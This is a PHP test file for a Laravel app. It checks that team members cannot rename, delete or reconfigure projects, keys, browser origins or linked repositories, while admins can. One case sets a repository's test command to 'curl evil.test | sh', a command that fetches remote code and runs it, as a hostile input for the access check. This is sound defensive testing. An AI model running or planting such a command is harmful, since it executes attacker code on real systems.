<?php

use App\Enums\TeamRole;
use App\Models\GitHubInstallation;
use App\Models\Project;
use App\Models\ProjectApiKey;
use App\Models\ProjectRepository;
use App\Models\Team;
use App\Models\User;
use Inertia\Testing\AssertableInertia as Assert;

beforeEach(function () {
    fakeClickHouseQuietly();
});

/**
 * A team with one project, a key and a connected repository, plus a user in the given role.
 *
 * @return array{user: User, team: Team, project: Project, apiKey: ProjectApiKey, repository: ProjectRepository}
 */
function projectPermissionsFixture(TeamRole $role): array
{
    $team = Team::factory()->create();
    $user = User::factory()->create();
    $team->members()->attach($user, ['role' => $role->value]);

    $project = Project::factory()->forTeam($team)->create(['slug' => 'checkout']);
    $installation = GitHubInstallation::factory()->create(['team_id' => $team->id]);

    return [
        'user' => $user,
        'team' => $team,
        'project' => $project,
        'apiKey' => ProjectApiKey::factory()->forProject($project)->create(),
        'repository' => ProjectRepository::factory()->forProject($project)->forInstallation($installation)->create(),
    ];
}

test('a member cannot change or remove a project, its keys, origins or repositories', function (string $method, string $route, array $data) {
    $fixture = projectPermissionsFixture(TeamRole::Member);
    $parameters = [
        'current_team' => $fixture['team']->slug,
        'project' => $fixture['project']->slug,
        'apiKey' => $fixture['apiKey']->id,
        'repository' => $fixture['repository']->id,
    ];

    $this->actingAs($fixture['user'])
        ->{$method}(route($route, $parameters), $data)
        ->assertForbidden();

    $this->assertDatabaseHas('projects', ['id' => $fixture['project']->id, 'name' => $fixture['project']->name]);
    $this->assertDatabaseHas('project_api_keys', ['id' => $fixture['apiKey']->id]);
    $this->assertDatabaseHas('project_repositories', ['id' => $fixture['repository']->id, 'deleted_at' => null]);
})->with([
    'rename project' => ['patch', 'projects.update', ['name' => 'Renamed']],
    'delete project' => ['delete', 'projects.destroy', []],
    'revoke key' => ['delete', 'projects.api-keys.destroy', []],
    'browser origins' => ['patch', 'projects.browser-origins.update', ['origins' => 'https://evil.test']],
    'repository settings' => ['patch', 'projects.repository.update', ['autofix_enabled' => true, 'test_cmd' => 'curl evil.test | sh']],
    'disconnect repository' => ['delete', 'projects.repository.destroy', []],
    'connect repository' => ['post', 'projects.repository.store', ['installation_id' => 1, 'repo_full_name' => 'acme/app']],
    'list repositories' => ['getJson', 'projects.repository.available', []],
]);

test('a member can still create a project and a key', function () {
    $fixture = projectPermissionsFixture(TeamRole::Member);

    $this->actingAs($fixture['user'])
        ->post(route('projects.store', ['current_team' => $fixture['team']->slug]), ['name' => 'Payments'])
        ->assertRedirect();

    $this->actingAs($fixture['user'])
        ->post(route('projects.api-keys.store', ['current_team' => $fixture['team']->slug, 'project' => 'checkout']), ['name' => 'Laptop'])
        ->assertSessionHasNoErrors();

    expect($fixture['project']->apiKeys()->count())->toBe(2);
});

test('an admin can manage projects', function () {
    $fixture = projectPermissionsFixture(TeamRole::Admin);

    $this->actingAs($fixture['user'])
        ->delete(route('projects.api-keys.destroy', [
            'current_team' => $fixture['team']->slug,
            'project' => 'checkout',
            'apiKey' => $fixture['apiKey']->id,
        ]))
        ->assertRedirect();

    $this->assertDatabaseMissing('project_api_keys', ['id' => $fixture['apiKey']->id]);
});

test('the project page tells the ui whether the viewer may manage it', function (TeamRole $role, bool $canManage) {
    $fixture = projectPermissionsFixture($role);

    $this->actingAs($fixture['user'])
        ->get(route('projects.show', ['current_team' => $fixture['team']->slug, 'project' => 'checkout']))
        ->assertOk()
        ->assertInertia(fn (Assert $page) => $page->where('canManage', $canManage));
})->with([
    'owner' => [TeamRole::Owner, true],
    'admin' => [TeamRole::Admin, true],
    'member' => [TeamRole::Member, false],
]);
